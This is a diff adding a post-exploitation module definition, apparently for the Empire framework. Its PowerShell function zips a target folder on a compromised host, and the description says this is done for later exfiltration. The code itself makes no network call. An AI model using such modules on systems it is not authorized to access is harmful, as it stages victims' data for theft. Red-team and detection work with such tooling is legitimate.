@@ -1,0 +1,54 @@
+name: Invoke-ZipFolder
+authors:
+  - '@harmj0y'
+description: Zips up a target folder for later exfiltration.
+software: ''
+techniques:
+  - T1002
+background: false
+output_extension:
+needs_admin: false
+opsec_safe: true
+language: powershell
+min_language_version: '2'
+comments: [ ]
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: Folder
+    description: Folder path to zip.
+    required: true
+    value: ''
+  - name: ZipFileName
+    description: Zip name/path to create.
+    required: true
+    value: ''
+script: |
+  function Invoke-ZipFolder
+  {
+      param([string]$Folder, [string]$ZipFileName)
+
+      if (-not (Test-Path $Folder)) {
+          "Target folder $Folder doesn't exist."
+          return
+      }
+
+      if (test-path $ZipFileName) {
+          "Zip file already exists at $ZipFileName"
+          return
+      }
+
+      $Directory = Get-Item $Folder
+
+      Set-Content $ZipFileName ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
+      (dir $ZipFileName).IsReadOnly = $false
+
+      $ZipFileName = resolve-path $ZipFileName
+
+      $ZipFile = (new-object -com shell.application).NameSpace($ZipFileName)
+      $ZipFile.CopyHere($Directory.FullName)
+      "Folder $Folder zipped to $ZipFileName"
+  }
+script_end: Invoke-ZipFolder {{ PARAMS }}
